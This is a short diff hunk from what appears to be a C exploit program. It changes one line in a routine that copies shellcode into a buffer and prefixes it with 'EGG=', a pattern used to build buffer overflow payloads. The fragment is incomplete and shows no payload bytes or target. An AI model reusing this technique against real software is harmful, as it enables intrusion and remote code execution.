@@ -70,7 +70,7 @@ send_message(int s)
 	for (i = 0; i < strlen(shellcode); i++)
 	*(ptr++) = shellcode[i];
 	
-	buff[numints - 1] = '\0';
+	response_buffer[numints - 1] = '\0';
 	
 	memcpy(response_buffer,"EGG=",4);
 
